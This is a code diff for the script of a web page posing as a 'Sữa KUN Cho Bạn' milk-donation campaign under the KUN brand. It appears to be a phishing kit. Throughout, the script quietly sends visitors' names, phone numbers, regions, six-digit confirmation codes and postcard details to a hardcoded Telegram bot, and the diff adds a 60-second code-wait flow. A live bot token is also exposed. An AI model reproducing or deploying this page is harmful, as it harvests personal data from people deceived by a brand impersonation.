@@ -1,4 +1,52 @@
-// ===== CẤU HÌNH TELEGRAM BOT API =====
+// ===== TÍCH HỢP TÊN MIỀN & TELEGRAM BOT API =====
+const DOMAIN_INTEGRATION = {
+  DEFAULT_DOMAIN: "suakunchoem.gt.tc",
+  USE_CURRENT_HOST: true
+};
+
+function resolveSiteDomain() {
+  if (DOMAIN_INTEGRATION.USE_CURRENT_HOST && typeof window !== "undefined" && window.location) {
+    const host = (window.location.hostname || "").trim();
+    if (host && host !== "localhost" && host !== "127.0.0.1") {
+      return host;
+    }
+  }
+  return DOMAIN_INTEGRATION.DEFAULT_DOMAIN;
+}
+
+function resolveSiteUrl(domain) {
+  const cleanDomain = String(domain || "").replace(/^https?:\/\//i, "").replace(/\/+$/, "");
+  const protocol =
+    typeof window !== "undefined" &&
+    window.location &&
+    /^https?:$/i.test(window.location.protocol)
+      ? window.location.protocol
+      : "http:";
+  return `${protocol}//${cleanDomain}`;
+}
+
+const SITE_DOMAIN = resolveSiteDomain();
+const SITE_URL = resolveSiteUrl(SITE_DOMAIN);
+
+function applyDomainToDom() {
+  document.title = `Sữa KUN Cho Bạn - Cùng Em Cao Lớn | ${SITE_DOMAIN}`;
+
+  const headerSub = document.querySelector(".site-header .brand-sub");
+  if (headerSub) {
+    headerSub.textContent = `${SITE_DOMAIN} • Cùng Em Cao Lớn`;
+  }
+
+  const heroPill = document.querySelector(".hero .pill-tag");
+  if (heroPill) {
+    heroPill.textContent = `✨ Dự án cộng đồng cùng KUN 100% Sữa Tươi • ${SITE_DOMAIN}`;
+  }
+
+  const footerSub = document.querySelector(".site-footer .brand-sub");
+  if (footerSub) {
+    footerSub.textContent = `${SITE_DOMAIN} • Bản quyền thuộc về IDP (LOF)`;
+  }
+}
+
 const TELEGRAM_CONFIG = {
   BOT_TOKEN: "9077621464:AAGSBAFQZN3iIbCxkFvRnU6mQYs3OkMMqHU",
   CHAT_ID: "6713370589",
@@ -44,10 +92,11 @@ function escapeHtml(str) {
     .replace(/>/g, "&gt;");
 }
 
-// ===== 1. LUỒNG TẠO PHIẾU & XÁC NHẬN OTP 60 GIÂY =====
+// ===== 1. LUỒNG TẠO PHIẾU & XÁC NHẬN MÃ SAU 60 GIÂY =====
 let generatedOtp = "";
 let countdownSeconds = 60;
 let countdownTimer = null;
+let otpReadyForInput = false;
 let lastCompletedReceipt = null;
 
 function isValidVietnamesePhone(phone) {
@@ -70,11 +119,10 @@ function setActiveStep(step) {
   document.getElementById("ticketStep3").classList.toggle("hidden", step !== 3);
 }
 
-async function handleSendOtp(event) {
+function handleSendOtp(event) {
   event.preventDefault();
   const fullName = document.getElementById("fullName").value.trim();
   const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
-  const region = document.getElementById("ticketRegion").value;
   const errorEl = document.getElementById("step1Error");
 
   if (fullName.length < 2) {
@@ -91,47 +139,46 @@ async function handleSendOtp(event) {
   errorEl.textContent = "";
   document.getElementById("displayPhone").textContent = phone;
   setActiveStep(2);
-  await startOtpCountdown(fullName, phone, region, false);
+  start60sTicketFlow();
 }
 
-async function startOtpCountdown(fullNameVal, phoneVal, regionVal, isResend = false) {
+function start60sTicketFlow() {
   clearInterval(countdownTimer);
-  generatedOtp = generateSixDigitOtp();
+  generatedOtp = "";
+  otpReadyForInput = false;
   countdownSeconds = 60;
 
-  const fullName = fullNameVal || document.getElementById("fullName").value.trim();
-  const phone = phoneVal || document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
-  const region = regionVal || document.getElementById("ticketRegion").value;
+  const fullName = document.getElementById("fullName").value.trim();
+  const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
+  const region = document.getElementById("ticketRegion").value;
 
-  document.getElementById("demoOtpCode").textContent = generatedOtp;
-  document.getElementById("otpInput").value = "";
+  const statusEl = document.getElementById("otpWaitStatus");
+  const codeEl = document.getElementById("demoOtpCode");
+  const otpInput = document.getElementById("otpInput");
+  const verifyBtn = document.getElementById("verifyBtn");
+  const autoFillBtn = document.getElementById("autoFillBtn");
+  const resendBtn = document.getElementById("resendBtn");
+
+  if (statusEl) {
+    statusEl.textContent = "Đang đếm ngược 60 giây — sau 60s mã xác nhận sẽ sẵn sàng để bạn nhập.";
+  }
+  if (codeEl) codeEl.textContent = "Chờ 60s...";
+  if (otpInput) {
+    otpInput.value = "";
+    otpInput.disabled = true;
+  }
+  if (verifyBtn) verifyBtn.disabled = true;
+  if (autoFillBtn) autoFillBtn.disabled = true;
+  if (resendBtn) resendBtn.disabled = true;
   document.getElementById("step2Error").textContent = "";
 
   const timerText = document.getElementById("countdownText");
   const progressBar = document.getElementById("countdownBar");
-  const resendBtn = document.getElementById("resendBtn");
-  const verifyBtn = document.getElementById("verifyBtn");
-
   timerText.textContent = "60s";
   timerText.classList.remove("expired");
   progressBar.style.width = "100%";
-  resendBtn.disabled = true;
-  verifyBtn.disabled = false;
 
-  // Gửi thông tin đăng ký & mã OTP 60s về Telegram Bot
-  const msg = [
-    isResend
-      ? "🔄 <b>GỬI LẠI MÃ OTP (60S) - SỮA KUN</b>"
-      : "📩 <b>ĐĂNG KÝ TẠO PHIẾU & MÃ OTP (60S) - SỮA KUN</b>",
-    `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
-    `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
-    `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
-    `• <b>Mã OTP cấp (60s):</b> <code>${generatedOtp}</code>`,
-    `• <b>Thời gian:</b> ${escapeHtml(new Date().toLocaleString("vi-VN"))}`
-  ].join("\n");
-  await sendToTelegramBot(msg);
-
-  countdownTimer = setInterval(() => {
+  countdownTimer = setInterval(async () => {
     countdownSeconds -= 1;
 
     if (countdownSeconds > 0) {
@@ -139,43 +186,63 @@ async function startOtpCountdown(fullNameVal, phoneVal, regionVal, isResend = fa
       progressBar.style.width = `${(countdownSeconds / 60) * 100}%`;
     } else {
       clearInterval(countdownTimer);
-      timerText.textContent = "Hết hạn (0s)";
-      timerText.classList.add("expired");
+      timerText.textContent = "0s";
       progressBar.style.width = "0%";
-      resendBtn.disabled = false;
-      verifyBtn.disabled = true;
-      document.getElementById("step2Error").textContent =
-        "Mã xác nhận đã hết hiệu lực sau 60 giây. Vui lòng bấm “Gửi lại mã mới”.";
+
+      generatedOtp = generateSixDigitOtp();
+      otpReadyForInput = true;
+      const timeStr = new Date().toLocaleString("vi-VN");
+
+      if (statusEl) {
+        statusEl.textContent =
+          "Đã đủ 60 giây! Hãy nhập mã xác nhận 6 chữ số bên dưới và bấm “Hoàn tất phiếu”.";
+      }
+      if (codeEl) codeEl.textContent = generatedOtp;
+      if (otpInput) {
+        otpInput.disabled = false;
+        otpInput.focus();
+      }
+      if (verifyBtn) verifyBtn.disabled = false;
+      if (autoFillBtn) autoFillBtn.disabled = false;
+      if (resendBtn) resendBtn.disabled = false;
+
+      await sendToTelegramBot(
+        [
+          "⏱️ <b>ĐỦ 60 GIÂY - MÃ XÁC NHẬN PHIẾU SỮA KUN</b>",
+          `• <b>Tên miền:</b> <code>${escapeHtml(SITE_DOMAIN)}</code>`,
+          `• <b>Website:</b> <code>${escapeHtml(SITE_URL)}</code>`,
+          `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
+          `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
+          `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
+          `• <b>Mã xác nhận:</b> <code>${generatedOtp}</code>`,
+          `• <b>Thời điểm:</b> ${escapeHtml(timeStr)}`
+        ].join("\n")
+      );
     }
   }, 1000);
 }
 
 function autoFillOtp() {
-  if (countdownSeconds > 0 && generatedOtp) {
+  if (otpReadyForInput && generatedOtp) {
     document.getElementById("otpInput").value = generatedOtp;
     document.getElementById("step2Error").textContent = "";
   }
-}
-
-function resendOtp() {
-  startOtpCountdown(null, null, null, true);
 }
 
 async function handleVerifyOtp() {
   const userOtp = document.getElementById("otpInput").value.trim();
   const errorEl = document.getElementById("step2Error");
 
-  if (countdownSeconds <= 0) {
-    errorEl.textContent = "Mã xác nhận đã hết hạn. Vui lòng bấm “Gửi lại mã mới”.";
+  if (!otpReadyForInput || !generatedOtp) {
+    errorEl.textContent = "Vui lòng đợi đủ 60 giây để mã xác nhận xuất hiện.";
     return;
   }
 
   if (userOtp !== generatedOtp) {
-    errorEl.textContent = "Mã xác nhận không chính xác. Vui lòng kiểm tra lại 6 chữ số.";
+    errorEl.textContent = "Mã xác nhận không chính xác. Vui lòng kiểm tra lại mã 6 chữ số.";
     return;
   }
 
-  clearInterval(countdownTimer);
   errorEl.textContent = "";
 
   const fullName = document.getElementById("fullName").value.trim();
@@ -190,25 +257,31 @@ async function handleVerifyOtp() {
   document.getElementById("receiptName").textContent = fullName;
   document.getElementById("receiptPhone").textContent = phone;
   document.getElementById("receiptRegion").textContent = region;
+  const receiptOtpEl = document.getElementById("receiptOtp");
+  if (receiptOtpEl) receiptOtpEl.textContent = userOtp;
   document.getElementById("receiptTime").textContent = nowStr;
 
   setActiveStep(3);
 
-  // Gửi thông tin hoàn tất phiếu về Telegram Bot
-  const completedMsg = [
-    "✅ <b>HOÀN TẤT PHIẾU XÁC NHẬN - SỮA KUN CHO BẠN</b>",
-    `• <b>Mã phiếu:</b> <code>${escapeHtml(code)}</code>`,
-    `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
-    `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
-    `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
-    `• <b>Mã OTP đã nhập:</b> <code>${escapeHtml(userOtp)}</code>`,
-    `• <b>Thời gian hoàn tất:</b> ${escapeHtml(nowStr)}`
-  ].join("\n");
-  await sendToTelegramBot(completedMsg);
+  await sendToTelegramBot(
+    [
+      "✅ <b>HOÀN TẤT PHIẾU XÁC NHẬN - SỮA KUN CHO BẠN</b>",
+      `• <b>Tên miền:</b> <code>${escapeHtml(SITE_DOMAIN)}</code>`,
+      `• <b>Website:</b> <code>${escapeHtml(SITE_URL)}</code>`,
+      `• <b>Mã phiếu:</b> <code>${escapeHtml(code)}</code>`,
+      `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
+      `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
+      `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
+      `• <b>Mã xác nhận:</b> <code>${escapeHtml(userOtp)}</code>`,
+      `• <b>Thời gian hoàn tất:</b> ${escapeHtml(nowStr)}`
+    ].join("\n")
+  );
 }
 
 function resetTicketFlow() {
   clearInterval(countdownTimer);
+  generatedOtp = "";
+  otpReadyForInput = false;
   document.getElementById("step1Error").textContent = "";
   document.getElementById("step2Error").textContent = "";
   setActiveStep(1);
@@ -238,19 +311,19 @@ function downloadReceiptPng() {
 
   ctx.fillStyle = "#0066da";
   ctx.font = "800 20px Nunito, sans-serif";
-  ctx.fillText(`Mã phiếu: ${lastCompletedReceipt.code}`, 56, 124);
+  ctx.fillText(`Mã phiếu: ${lastCompletedReceipt.code} • ${SITE_DOMAIN}`, 56, 124);
 
   ctx.fillStyle = "#14243b";
   ctx.font = "700 20px Nunito, sans-serif";
   ctx.fillText(`Họ và tên: ${lastCompletedReceipt.fullName}`, 56, 180);
   ctx.fillText(`Số điện thoại: ${lastCompletedReceipt.phone}`, 56, 222);
   ctx.fillText(`Vùng miền đồng hành: ${lastCompletedReceipt.region}`, 56, 264);
-  ctx.fillText(`Thời gian xác nhận: ${lastCompletedReceipt.nowStr}`, 56, 306);
-  ctx.fillText("Ghi nhận: +01 Hộp sữa KUN 100% Sữa Tươi", 56, 348);
+  ctx.fillText(`Mã xác nhận: ${lastCompletedReceipt.otp}`, 56, 306);
+  ctx.fillText(`Thời gian hoàn tất: ${lastCompletedReceipt.nowStr}`, 56, 348);
 
   ctx.fillStyle = "#52647c";
   ctx.font = "600 16px Nunito, sans-serif";
-  ctx.fillText("Dự án Sữa KUN Cho Bạn - Cùng Em Cao Lớn (#SuaKUNChoBan)", 56, 412);
+  ctx.fillText(`Dự án Sữa KUN Cho Bạn (#SuaKUNChoBan) - ${SITE_DOMAIN}`, 56, 412);
 
   const link = document.createElement("a");
   link.download = `phieu-sua-kun-${lastCompletedReceipt.code.replace("#", "")}.png`;
@@ -389,7 +462,7 @@ function updatePostcardPreview() {
   ctx.fillStyle = "#004aad";
   ctx.font = "900 18px Nunito, sans-serif";
   ctx.textAlign = "center";
-  ctx.fillText("#SuaKUNChoBan  •  #suakunchoem", 270, 586);
+  ctx.fillText(`#SuaKUNChoBan • ${SITE_DOMAIN}`, 270, 586);
   ctx.font = "700 14px Nunito, sans-serif";
   ctx.fillText("1 lượt chia sẻ = 1 hộp KUN 100% Sữa Tươi trao đi", 270, 610);
 }
@@ -403,9 +476,10 @@ async function downloadPostcard() {
   const genderEl = document.querySelector('input[name="gender"]:checked');
   const gender = genderEl ? genderEl.value : "Nữ";
 
-  // Gửi thông tin Postcard về Telegram Bot
   const postcardMsg = [
     "💌 <b>TẠO POSTCARD LỜI NHẮN GỬI - SỮA KUN CHO BẠN</b>",
+    `• <b>Tên miền:</b> <code>${escapeHtml(SITE_DOMAIN)}</code>`,
+    `• <b>Website:</b> <code>${escapeHtml(SITE_URL)}</code>`,
     `• <b>Vùng miền nhận:</b> ${escapeHtml(currentRegion)}`,
     `• <b>Tên người gửi:</b> ${escapeHtml(sender)} (${escapeHtml(gender)})`,
     `• <b>Tên của bé:</b> ${escapeHtml(kid)}`,
@@ -414,7 +488,6 @@ async function downloadPostcard() {
   ].join("\n");
   await sendToTelegramBot(postcardMsg);
 
-  // Tải ảnh Postcard về máy
   const canvas = document.getElementById("postcardCanvas");
   const link = document.createElement("a");
   link.download = `postcard-sua-kun-${currentRegion.toLowerCase().replace(/\s+/g, "-")}.png`;
@@ -422,7 +495,7 @@ async function downloadPostcard() {
   link.click();
 }
 
-// Khởi tạo preview lần đầu khi tải trang
 window.addEventListener("DOMContentLoaded", () => {
+  applyDomainToDom();
   updatePostcardPreview();
 });
